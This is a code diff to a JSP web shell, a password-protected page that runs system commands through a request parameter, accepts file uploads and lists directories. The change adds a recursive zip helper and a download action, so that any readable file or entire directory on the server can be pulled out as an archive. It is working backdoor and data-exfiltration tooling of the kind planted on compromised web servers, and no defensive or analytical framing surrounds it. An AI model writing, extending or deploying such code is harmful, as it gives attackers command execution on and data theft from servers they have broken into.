@@ -2,6 +2,8 @@
 <%@ page import="java.util.Properties" %>
 <%@ page import="java.util.Hashtable" %>
 <%@ page import="java.util.StringTokenizer" %>
+<%@ page import="java.util.zip.ZipOutputStream" %>
+<%@ page import="java.util.zip.ZipEntry" %>
 
 <%!
     static boolean isNotEmpty(Object obj) {
@@ -45,6 +47,28 @@
             filePath = new File(".").getAbsolutePath();
         }
         return filePath;
+    }
+
+    static void zipFile(ZipOutputStream zip, File file, int rootLength) throws IOException{
+        if(file.isDirectory() && file.canRead()){
+            File[] files = file.listFiles();
+            for(File f:files){
+                zipFile(zip, f, rootLength);
+            }
+        } else {
+            FileInputStream in = new FileInputStream(file);
+            String separator = File.separator + File.separator;
+            zip.putNextEntry(new ZipEntry(file.getAbsolutePath().substring(rootLength).replaceAll(separator, "/")));
+            zip.write(inutStreamToOutputStream(in).toByteArray());
+            in.close();
+        }
+    }
+
+    static void zip(ByteArrayOutputStream out, File file) throws IOException{
+        ZipOutputStream zos = new ZipOutputStream(out);
+        String parent = file.getParentFile().getAbsolutePath();
+        zipFile(zos, file, parent.length()+1);
+        zos.close();
     }
 
     public enum Attributes {
@@ -516,13 +540,38 @@
     Command command = new Command();
 
     if (isNotEmpty(reqPass) && reqPass.equals(application.getInitParameter("pass"))) {
-        String path = application.getRealPath(request.getRequestURI());
-        String realPath = findRealPath(path);
-        request.setAttribute("path" , realPath);
+        String appPath = application.getRealPath(request.getRequestURI());
+        String path = isNotEmpty(reqPath) ? reqPath : findRealPath(appPath);
         if (isNotEmpty(reqMethod) && "GET".equalsIgnoreCase(reqMethod)) {
             if (isNotEmpty(reqAction) && reqAction.equals(actions[0]) && isNotEmpty(reqArgs)) {
                 out.println(formatMessage(command.runCommand(reqArgs)));
             } else if (isNotEmpty(reqAction) && reqAction.equals(actions[2])) {
+                if(isNotEmpty(reqArgs) && isNotEmpty(path)) {
+                    File file = new File(path, reqArgs);
+                    String fileName = file.isDirectory() ? file.getName()+".zip":file.getName();
+                    response.setHeader("Content-Disposition", "attachment; filename="+fileName);
+                    BufferedOutputStream bos = new BufferedOutputStream(response.getOutputStream());
+                    if(file.isDirectory() && file.canRead() && file.exists()) {
+                        response.setContentType("application/zip");
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        zip(baos, file);
+                        bos.write(baos.toByteArray());
+                        baos.close();
+                    } else if (file.canRead() && file.exists()) {
+                        response.setContentType("application/octet-stream");
+                        InputStream in = new FileInputStream(file);
+                        int len;
+                        byte[] buf = new byte[1024];
+                        while ((len = in.read(buf)) > 0) {
+                            bos.write(buf, 0, len);
+                        }
+                        in.close();
+                    }
+                    bos.close();
+                    out.clear();
+                    out = pageContext.pushBody();
+                    return ;
+                }
 
             } else if (isNotEmpty(reqAction) && reqAction.equals(actions[3])) {
                 out.println(formatMessage(command.runPowerCommand(reqArgs)));
@@ -538,21 +587,15 @@
             }
         } else if (isNotEmpty(reqMethod) && "POST".equalsIgnoreCase(reqMethod)) {
             if(isNotEmpty(reqContentType) && reqContentType.startsWith("multipart")) {
-                String destPath = null;
                 String boundary;
                 int bStart = 0;
                 bStart          = reqContentType.lastIndexOf("oundary=");
                 boundary        = reqContentType.substring(bStart + 8);
                 Upload fileUpload = new Upload();
 
-                if (!isNotEmpty(reqPath) && isNotEmpty(realPath)) {
-                    destPath = realPath;
-                } else if (isNotEmpty(reqPath)) {
-                    destPath = reqPath;
-                }
-                Hashtable hashtable = fileUpload.parseData(request.getInputStream(), boundary, destPath);
-                out.println("File uploaded to: "+ destPath);
-                out.println(Command.listDir(destPath));
+                Hashtable hashtable = fileUpload.parseData(request.getInputStream(), boundary, path);
+                out.println("File uploaded to: "+ path);
+                out.println(Command.listDir(path));
             }
         }
     }
